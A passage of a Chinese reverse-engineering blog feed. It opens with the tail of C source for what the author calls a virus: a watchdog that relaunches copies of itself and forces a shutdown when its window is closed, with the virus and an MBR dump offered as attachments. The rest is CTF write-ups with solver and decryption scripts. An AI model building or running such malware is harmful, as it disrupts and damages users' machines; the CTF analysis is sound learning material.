class="line">ReleaseDC(desktop, winddc);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">th</span><span class="params">(LPVOID lpParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">30</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">(*(*(<span class="keyword">int</span>(__cdecl*)(<span class="keyword">void</span>)) lpParam))();</span><br><span class="line">Sleep(<span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fungame</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">functable a[<span class="number">9</span>];</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">a[<span class="number">0</span>].func = func1;</span><br><span class="line">a[<span class="number">1</span>].func = func2;</span><br><span class="line">a[<span class="number">2</span>].func = func3;</span><br><span class="line">a[<span class="number">3</span>].func = func4;</span><br><span class="line">a[<span class="number">4</span>].func = func5;</span><br><span class="line">a[<span class="number">5</span>].func = func6;</span><br><span class="line">a[<span class="number">6</span>].func = func7;</span><br><span class="line">a[<span class="number">7</span>].func = func9;</span><br><span class="line">a[<span class="number">8</span>].func = func10;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DWORD* lpParam;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">9</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">lpParam =(DWORD*) a[i].func;</span><br><span class="line">Sleep(<span class="number">20000</span>);</span><br><span class="line">CreateThread(<span class="number">0</span>, <span class="number">0</span>, th, lpParam, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">Sleep(<span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">WndProc</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">HWND hwnd,</span></span></span><br><span class="line"><span class="function"><span class="params">UINT uMsg,</span></span></span><br><span class="line"><span class="function"><span class="params">WPARAM wParam,</span></span></span><br><span class="line"><span class="function"><span class="params">LPARAM lParam</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (uMsg != <span class="number">16</span> &amp;&amp; uMsg != <span class="number">22</span>)</span><br><span class="line"><span class="keyword">return</span> DefWindowProcW(hwnd, uMsg, wParam, lParam);</span><br><span class="line">shutdown();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">int</span> process_num = <span class="number">3</span>;</span><br><span class="line">WCHAR* filename;</span><br><span class="line">LPWSTR cmdline;</span><br><span class="line">LPWSTR* Argv;</span><br><span class="line"><span class="keyword">int</span> pNumArgs = <span class="number">0</span>;</span><br><span class="line">WNDCLASSEXA wndclass;</span><br><span class="line">MSG Msg;</span><br><span class="line">HWND hWnd;</span><br><span class="line">SHELLEXECUTEINFOW pExecInfo = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">wide = GetSystemMetrics(SM_CXFULLSCREEN);</span><br><span class="line">high = GetSystemMetrics(SM_CYFULLSCREEN);</span><br><span class="line">cmdline = GetCommandLineW();</span><br><span class="line">Argv = CommandLineToArgvW(cmdline, &amp;pNumArgs);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pNumArgs &gt; <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (!lstrcmpW(Argv[<span class="number">1</span>], <span class="string">L&quot;/watch&quot;</span>))</span><br><span class="line">&#123;</span><br><span class="line">CreateThread(<span class="number">0</span>, <span class="number">0</span>, check, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">wndclass.cbSize = <span class="number">48</span>;</span><br><span class="line">wndclass.lpszClassName = <span class="string">&quot;The_Itach1&quot;</span>;</span><br><span class="line">wndclass.lpfnWndProc = WndProc;</span><br><span class="line">wndclass.style = <span class="number">0</span>;</span><br><span class="line">wndclass.cbClsExtra = <span class="number">0</span>;</span><br><span class="line">wndclass.hInstance = <span class="number">0</span>;</span><br><span class="line">wndclass.hIcon = <span class="number">0</span>;</span><br><span class="line">wndclass.hCursor = <span class="number">0</span>;</span><br><span class="line">wndclass.hbrBackground = <span class="number">0</span>;</span><br><span class="line">wndclass.hIconSm = <span class="number">0</span>;</span><br><span class="line">RegisterClassExA(&amp;wndclass);</span><br><span class="line">hWnd = CreateWindowExA(<span class="number">0</span>, <span class="string">&quot;The_Itach1&quot;</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">100</span>, <span class="number">100</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">while</span> (GetMessageW(&amp;Msg, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>) != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">TranslateMessage(&amp;Msg);</span><br><span class="line">DispatchMessageW(&amp;Msg);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fungame();</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">Sleep(<span class="number">0x2710</span>u);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (MessageBoxA(</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="string">&quot;Are you ready to play the new game?\r\n&quot;</span></span><br><span class="line"><span class="string">&quot;Please turn off all other processes, and then click OK.\r\n&quot;</span></span><br><span class="line">, <span class="string">&quot;The_Itach1&quot;</span></span><br><span class="line">, <span class="number">0x34</span>u) == <span class="number">6</span>)</span><br><span class="line">&#123;</span><br><span class="line">filename = (WCHAR*)LocalAlloc(<span class="number">0x40</span>u, <span class="number">0x4000</span>u);</span><br><span class="line">GetModuleFileNameW(<span class="number">0</span>, filename, <span class="number">0x2000</span>u);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; process_num; i++)</span><br><span class="line">&#123;</span><br><span class="line">ShellExecuteW(<span class="number">0</span>, <span class="number">0</span>, filename, <span class="string">L&quot;/watch&quot;</span>, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pExecInfo.cbSize = <span class="number">60</span>;</span><br><span class="line">pExecInfo.lpFile = filename;</span><br><span class="line">pExecInfo.lpParameters = <span class="string">L&quot;/main&quot;</span>;</span><br><span class="line">pExecInfo.fMask = <span class="number">64</span>;</span><br><span class="line">pExecInfo.hwnd = <span class="number">0</span>;</span><br><span class="line">pExecInfo.lpVerb = <span class="number">0</span>;</span><br><span class="line">pExecInfo.lpDirectory = <span class="number">0</span>;</span><br><span class="line">pExecInfo.hInstApp = <span class="number">0</span>;</span><br><span class="line">pExecInfo.nShow = <span class="number">10</span>;</span><br><span class="line">ShellExecuteExW(&amp;pExecInfo);</span><br><span class="line">SetPriorityClass(pExecInfo.hProcess, HIGH_PRIORITY_CLASS);</span><br><span class="line">&#125;</span><br><span class="line">ExitProcess(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>myblog：<a href="https://the_itach1.gitee.io/">The_Itach1</a></p><p>然后附件给一下病毒和dump出的MRB部分吧。</p>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 病毒 </tag>
            
            <tag> 编程开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>祥云杯 部分 re wp</title>
      <link href="2021/08/26/%E7%A5%A5%E4%BA%91%E6%9D%AF%20%E9%83%A8%E5%88%86%20re%20wp/"/>
      <url>2021/08/26/%E7%A5%A5%E4%BA%91%E6%9D%AF%20%E9%83%A8%E5%88%86%20re%20wp/</url>
      
        <content type="html"><![CDATA[<h1 id="祥云杯-部分-re-wp"><a href="#祥云杯-部分-re-wp" class="headerlink" title="祥云杯 部分 re wp"></a>祥云杯 部分 re wp</h1><p>这次就只复现感觉对目前自己有意义的题吧，那个驱动看了看，了解了大致过程，差不多就行了，如果没了解过驱动，没写过驱动，下次遇到驱动题，还是只能乱分析。</p><p>先说说对现在ctf的re部分的看法吧，考点越来越广了，感觉就是需要你见识广，几乎什么都了解，不然对一道题根本无从下手，windows的exe，linux的elf，驱动，，安卓的apk，python的pyc，windows编程，各种算法，甚至一些比较特殊的语言写的程序，比如说go，c#，lua，rust，还有各种题型，maze，mfc窗口check，windows窗口check，vm。如果对每种都比较熟悉的话，做题肯定是相对容易的，但实际情况是根本不能对每种都能掌握，特别是去符号的高级语言。所以对于ctf，我只能说打过的人都晓得，懂得都懂，个人认为还是主要将其当做一个抓要点学习，娱乐的比赛，当然也是个人看法。</p><p>最近也挺迷茫的，不知道干啥，马上也快大二了，也一直在思考，颓废了一阵，也就当休息了，希望能早点找到新目标。但是个人认为多思考方向远比漫无目的的学习要好。</p><h2 id="Dizzy"><a href="#Dizzy" class="headerlink" title="Dizzy"></a>Dizzy</h2><p>本次re最简单的一道题，就是ida中f5不了，也好解决，跟着报错搜搜就行。</p><pre><code>修改配置文件IDA 7.0\cfg\hexrays.cfgMAX_FUNCSIZE            = 64        // Functions over 64K are not decompiled// 修改为：MAX_FUNCSIZE            = 1024        // Functions over 64K are not decompiled</code></pre><p>然后f5，等待个几分钟，就发现加密过程就是+，-，^，都可逆，刚开始还用z3解，但是太多了，既然都可逆，就直接倒过来，加减互换就行了。</p><p>先用python得到算式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">lines = <span class="built_in">open</span>(<span class="string">&#x27;a.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).readlines()</span><br><span class="line">fp = <span class="built_in">open</span>(<span class="string">&#x27;b.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> lines:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;+&#x27;</span> <span class="keyword">in</span> s:</span><br><span class="line">        fp.write( s.replace(<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;-&#x27;</span>))</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;-&#x27;</span> <span class="keyword">in</span> s:</span><br><span class="line">        fp.write(s.replace(<span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;+&#x27;</span>))</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    fp.write(s)</span><br><span class="line">fp.close()</span><br><span class="line"></span><br><span class="line">lines = <span class="built_in">open</span>(<span class="string">&#x27;b.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).readlines()</span><br><span class="line">a=[]</span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> lines:</span><br><span class="line">  a.append(s)</span><br><span class="line">a=a[::-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">  print(i,end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>解flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">flag=[  <span class="number">0x27</span>, <span class="number">0x3C</span>, <span class="number">0xE3</span>, <span class="number">0xFC</span>, <span class="number">0x2E</span>, <span class="number">0x41</span>, <span class="number">0x07</span>, <span class="number">0x5E</span>, <span class="number">0x62</span>, <span class="number">0xCF</span>,</span><br><span class="line">  <span class="number">0xE8</span>, <span class="number">0xF2</span>, <span class="number">0x92</span>, <span class="number">0x80</span>, <span class="number">0xE2</span>, <span class="number">0x36</span>, <span class="number">0xB4</span>, <span class="number">0xB2</span>, <span class="number">0x67</span>, <span class="number">0x77</span>,</span><br><span class="line">  <span class="number">0x0F</span>, <span class="number">0xF6</span>, <span class="number">0x0D</span>, <span class="number">0xB6</span>, <span class="number">0xED</span>, <span class="number">0x1C</span>, <span class="number">0x65</span>, <span class="number">0x8A</span>, <span class="number">0x07</span>, <span class="number">0x53</span>,</span><br><span class="line">  <span class="number">0xA6</span>, <span class="number">0x66</span>]</span><br><span class="line"></span><br><span class="line">flag[<span class="number">16</span>] -= flag[<span class="number">20</span>]</span><br><span class="line">flag[<span class="number">0</span>] -= flag[<span class="number">5</span>]</span><br><span class="line">flag[<span class="number">21</span>] += <span class="number">54</span></span><br><span class="line">flag[<span class="number">22</span>] += flag[<span class="number">31</span>]</span><br><span class="line">flag[<span class="number">29</span>] -= flag[<span class="number">25</span>]</span><br><span class="line">flag[<span class="number">18</span>] ^= flag[<span class="number">14</span>]</span><br><span class="line">flag[<span class="number">1</span>] -= <span class="number">33</span></span><br><span class="line">flag[<span class="number">31</span>] -= <span class="number">33</span></span><br><span class="line">···</span><br><span class="line">···</span><br><span class="line">···</span><br><span class="line">flag[<span class="number">10</span>] -= flag[<span class="number">6</span>]</span><br><span class="line">flag[<span class="number">10</span>] += flag[<span class="number">27</span>]</span><br><span class="line">flag[<span class="number">6</span>] -= flag[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">  print(<span class="built_in">chr</span>(i&amp;<span class="number">0xff</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#flag&#123;Try_R3vers1ng_W1th_ScR!pt!&#125;</span></span><br></pre></td></tr></table></figure><h2 id="勒索解密"><a href="#勒索解密" class="headerlink" title="勒索解密"></a>勒索解密</h2><p>这道题是有学习价值的，可以用来学习&lt;wincrypt.h&gt; 这个windows的密码学库，里面提供了很多加密算法的api函数，可以去搜索，了解。这道题就是用了这个库，并将文件信息弄成了一个结构体，实际上就是HCRYPTPROV。类似于这篇文章中的类<a href="https://blog.csdn.net/neubuffer/article/details/16899905">https://blog.csdn.net/neubuffer/article/details/16899905</a></p><p>这道题给了两个文件，一个是加密程序exe，另一个是加密后的文件flag.bmp.ctf_crypter。根据题目描述，我们可以在指定文件夹创建一个.bmp文件来方便我们调试这个程序，通过.bmp可以了解到原文件是一个图片文件。</p><p>开始分析，main函数里面的关键代码<br><img src="https://i.loli.net/2021/08/26/xAwXnvqofBjJmlD.png"><br>然后看encrypt函数<br><img src="https://i.loli.net/2021/08/26/R5Jz6hkSKZTXgUb.png"><br>然后aes中也是16个byte依次加密。后面需要注意的地方就是文件生成的问题了。<br><img src="https://i.loli.net/2021/08/26/ExnjgGdrVRqtspm.png"><br>所以我们只用aes解密[:-0x84]就行了，这道题应该是想让我们用rsa解密得到原来的key，然后解密aes，但是那个key是可以用时间来得到的或者范围爆破。</p><p>也有文章已经将加密解密过程写出来了。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>  _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;wincrypt.h&gt;                  //用的这个库里面的加解密函数</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;Advapi32.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;Crypt32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decrypt_file</span><span class="params">(DWORD x)</span>         <span class="comment">//文件解密</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HCRYPTPROV  ctx;</span><br><span class="line">    HCRYPTHASH  ctx_has;</span><br><span class="line">    HCRYPTKEY  aeskey;</span><br><span class="line">    DWORD v8 = <span class="number">16</span>;</span><br><span class="line">    FILE* fp;</span><br><span class="line">    FILE* fp2;</span><br><span class="line">    DWORD TestData[<span class="number">500</span>] = &#123; <span class="number">0x0EC62FB2</span>, <span class="number">0x4B54D44F</span>, x, <span class="number">0x8EB1E721</span> &#125;;      <span class="comment">//第三个数是time(0)</span></span><br><span class="line"></span><br><span class="line">    fopen_s(&amp;fp,<span class="string">&quot;flag.bmp.ctf_crypter&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="keyword">size_t</span> size = <span class="number">0</span>;</span><br><span class="line">    fseek(fp, <span class="number">0</span>, SEEK_END);              <span class="comment">//文件大小</span></span><br><span class="line">    size = ftell(fp);</span><br><span class="line">    fseek(fp, <span class="number">0</span>, SEEK_SET);             <span class="comment">//重置文件指针到文件头</span></span><br><span class="line">    <span class="keyword">size_t</span> size2 = (size - <span class="number">0x84</span>) / <span class="number">16</span>;  <span class="comment">//减去加密后的文件的后两部分</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> outname[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    sprintf_s(outname, <span class="string">&quot;data%x.bmp&quot;</span>, x);</span><br><span class="line">    fopen_s(&amp;fp2,outname, <span class="string">&quot;wb&quot;</span>);   <span class="comment">//创建.bmp文件</span></span><br><span class="line"></span><br><span class="line">    CryptAcquireContextA(&amp;ctx, <span class="number">0</span>, <span class="string">&quot;Microsoft Enhanced RSA and AES Cryptographic Provider&quot;</span>, <span class="number">0x18</span>, <span class="number">0xF0000000</span>);</span><br><span class="line">    CryptCreateHash(ctx, <span class="number">0x800C</span>u, <span class="number">0</span>, <span class="number">0</span>, &amp;ctx_has);</span><br><span class="line">    CryptHashData(ctx_has, (<span class="keyword">const</span> BYTE*)TestData, <span class="number">16u</span>, <span class="number">0</span>);</span><br><span class="line">    CryptDeriveKey(ctx, <span class="number">0x660E</span>u, ctx_has, <span class="number">0</span>, &amp;aeskey);</span><br><span class="line">    BYTE pbData[<span class="number">4</span>] = &#123; <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span> &#125;;</span><br><span class="line">    BYTE v11[<span class="number">4</span>] = &#123; <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">    CryptSetKeyParam(aeskey, <span class="number">4u</span>, pbData, <span class="number">0</span>);</span><br><span class="line">    CryptSetKeyParam(aeskey, <span class="number">3u</span>, v11, <span class="number">0</span>);</span><br><span class="line">    DWORD encLen = <span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size2; i++)        <span class="comment">//16字节16字节的对文件进行解密</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">char</span> buffer[<span class="number">32</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        fread(buffer, <span class="number">16</span>, <span class="number">1</span>, fp);</span><br><span class="line">        CryptDecrypt(aeskey, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, (BYTE*)buffer, &amp;encLen);</span><br><span class="line">        <span class="comment">//CryptEncrypt(aeskey, 0, 0, 0, (BYTE*)buffer, &amp;encLen);</span></span><br><span class="line">        fwrite(buffer, <span class="number">16</span>, <span class="number">1</span>, fp2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fclose(fp);</span><br><span class="line">    fclose(fp2);</span><br><span class="line">    CryptDestroyHash(ctx_has);</span><br><span class="line">    CryptDestroyKey(aeskey);</span><br><span class="line">    CryptReleaseContext(ctx, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD time = <span class="number">0x611a1105</span>;</span><br><span class="line">    decrypt_file(time);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>或者用python来解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">key = <span class="built_in">bytearray</span>.fromhex(<span class="string">&#x27;b22fc60e4fd4544b05111a6121e7b18e&#x27;</span>)</span><br><span class="line">key = hashlib.sha256(key).hexdigest()</span><br><span class="line">key = <span class="built_in">bytes</span>.fromhex(key)[:<span class="number">16</span>]</span><br><span class="line">iv=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">16</span></span><br><span class="line">cipher=AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line">fp = <span class="built_in">open</span>(<span class="string">&#x27;flag.bmp.ctf_crypter&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">tmp=fp.read()[:-<span class="number">0x84</span>]</span><br><span class="line">tmp2=cipher.decrypt(tmp)</span><br><span class="line">fp2=<span class="built_in">open</span>(<span class="string">&quot;flag.bmp&quot;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">fp2.write(tmp2)</span><br><span class="line">fp.close()</span><br><span class="line">fp2.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="rua"><a href="#rua" class="headerlink" title="rua"></a>rua</h2><p>好家伙，现在做个题还要配mac环境了，这道题去了符号表，还是得动调来看流程，看内存，题做不了倒是可以来学习salsa20<a href="https://zh.wikipedia.org/wiki/Salsa20">https://zh.wikipedia.org/wiki/Salsa20</a>。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>inctf re 部分wp</title>
      <link href="2021/08/16/inctf%20re%20%E9%83%A8%E5%88%86wp/"/>
      <url>2021/08/16/inctf%20re%20%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[<h1 id="inctf-re-部分wp"><a href="#inctf-re-部分wp" class="headerlink" title="inctf re 部分wp"></a>inctf re 部分wp</h1><p>比赛时看了4道题，做起了两道，那道vm看太久了，就是爆破脚本有问题。</p><h2 id="find-plut0"><a href="#find-plut0" class="headerlink" title="find_plut0"></a>find_plut0</h2><p>一道z3约束器求解题，将flag进行两轮计算，但是ida打开时很难看，我们可以改一下类型，转换为数组，效果如下，这样就方便复制了。<br><img src="https://i.loli.net/2021/08/16/sE75IfhHaSYcokr.png"></p><p>解题脚本，这道题存在多解，找到可视字符串就行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">code=<span class="string">&#x27;inctf&#123;U_Sur3_m4Te?&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">tmp2 = [<span class="number">0</span>] * <span class="number">19</span></span><br><span class="line">tmp1 = [<span class="number">0</span>] * <span class="number">23</span></span><br><span class="line"><span class="built_in">len</span>=<span class="built_in">len</span>(code)</span><br><span class="line">s = Solver()</span><br><span class="line">flag = [BitVec(<span class="string">&#x27;flag[%d]&#x27;</span> % i, <span class="number">32</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>)]</span><br><span class="line">tmp1[<span class="number">0</span>] = flag[<span class="number">0</span>] - <span class="number">50</span> + flag[<span class="number">1</span>]</span><br><span class="line">tmp1[<span class="number">1</span>] = flag[<span class="number">1</span>] - <span class="number">100</span> + flag[<span class="number">2</span>]</span><br><span class="line">tmp1[<span class="number">2</span>] = <span class="number">4</span> * flag[<span class="number">2</span>]</span><br><span class="line">tmp1[<span class="number">3</span>] = flag[<span class="number">3</span>] ^ <span class="number">0x46</span></span><br><span class="line">tmp1[<span class="number">4</span>] = <span class="number">36</span> - (flag[<span class="number">3</span>] - flag[<span class="number">4</span>])</span><br><span class="line">tmp1[<span class="number">6</span>] = flag[<span class="number">6</span>] * flag[<span class="number">5</span>] + <span class="number">99</span></span><br><span class="line">tmp1[<span class="number">7</span>] = flag[<span class="number">6</span>] ^ flag[<span class="number">7</span>]</span><br><span 